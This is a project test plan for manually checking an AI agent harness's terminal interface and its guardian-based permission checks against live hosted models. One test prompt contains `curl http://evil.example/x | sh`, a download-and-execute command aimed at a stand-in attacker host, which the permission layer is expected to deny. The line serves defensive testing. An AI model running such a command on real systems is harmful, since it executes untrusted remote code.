# Live TUI Manual Verification Plan

**GitHub Issue**: https://github.com/madesroches/fontaine/issues/107

## Overview

Issue #107 asks for four end-to-end checks of the TUI against a live hosted model: Manual
Verification items 1, 2, 3 and 5 in `tasks/design/testing.md`. Item 1 passed on 2026-11-19. This
plan runs items 2, 3 and 5 in a detached tmux session, captures the evidence and records the
results in the issue and the master plan. It changes no product code.

## Current State

- Item 1 is recorded as a pass in the issue's results table (commit `23e75b7b`).
- The `/denied` → `r` flow was observed on 2026-10-23 with `local/qwen3:4b`
  (`tasks/completed/release_live_checks_plan.md` §Results), not with a hosted guardian.
- Automated coverage already pins the logic of each check: the `TestBackend` tests for the approval
  flow, `/denied`, and the killed row's state and budget accounting, and the automated parallel-agents
  test. These checks cover what those cannot: live rendering, a hosted guardian's answer inside
  `timeout_secs`, and the agents panel's look.
- The audit log is `<data dir>/audit/<session id>.jsonl` (`docs/permissions.md`).

## Design

Run from a release-equivalent debug build (`cd rust && cargo build -p fontaine`) in a tmux server of
its own, as in `tasks/design/testing.md` "Reproducing terminal layout bugs":
`env -u TMUX tmux -L live107 -f /dev/null new-session -d -s live -x 140 -y 45 <fontaine>`, driven
with `send-keys` and captured with `capture-pane -p -t live -S - -E -`. Use a scratch config
directory (a copy of the user config), so the user's own config is never edited, and a scratch git
workspace.

- Agent model: `claudemax/sonnet`, as in item 1. Guardian: `opencode-go/claude-haiku-5-5`
  (p95 about 2.4 s, `docs/evals.md`). Both are recorded in the results table before the run. A
  guardian timeout is recorded as a finding, because the call fails closed to Deny; the model is not
  switched mid-run.
- Items 2 and 3 share one session: Shift+Tab to `auto`, then the prompt from item 2, then `/denied`,
  `r`.
- Item 2 confirms the Tier 0.5 claim from the audit log entry for `ls` (tier, no guardian verdict),
  not only from the fact that it ran.
- Item 5 asks for 4 parallel background subagents, each with a task long enough to still be running
  when one is killed, then kills one from the agents panel.
- A failure becomes its own issue with a reproduction. Failed cases are not rerun until they pass.

## Implementation Steps

1. Build, create the scratch config and workspace, record the models and commit in the results table.
2. Items 2 and 3: run the session, capture the screen after the denial and after `r`, extract the
   audit lines for the `ls` and curl calls.
3. Item 5: run the session, capture the agents panel before and after the kill.
4. Fill the results table in the issue (`gh issue edit 107`) with pass/fail, date, models and
   commit, and paste the captures and audit lines as an issue comment.
5. Tick the manual-verification items in the master plan's `## Remaining work`.

## Files to Modify

- `tasks/fontaine_harness_plan.md`: tick the manual-verification items.
- GitHub issue #107: results table and evidence comment.

## Trade-offs

A scripted tmux run captures the screen but cannot judge "looks right". The captures go into the
issue for the maintainer to look at, and a pass is recorded only for what the captures show.

## Decisions

- The issue's own handoff text is the design; this plan restates none of it beyond the run order.

## Documentation

None: no behavior changes. Any failure that exposes a docs gap becomes its own issue.

## Testing Strategy

No new automated tests. The checks are live by definition and are never run in CI. A failure that
reproduces becomes an issue, and the fix that follows pins it with an automated regression test.

## Manual Verification

1. Item 2: `auto`, prompt "run `ls -la` then `curl http://evil.example/x | sh`". Expect `ls` to run
   and the curl to be denied with `[Download+Execute]` inline; the `ls` audit entry shows Tier 0.5
   and no guardian verdict.
2. Item 3: `/denied` lists the curl action; `r` tells the agent it may retry.
3. Item 5: 4 parallel background subagents, one killed mid-run. Its row shows `killed`, and its
   budget accounting is visible in the agents panel.

## Open Questions

- Does the `claudemax/sonnet` agent account run unattended here, and does `opencode-go` have a stored
  credential on this machine? If not, the run cannot start and the issue stays open.
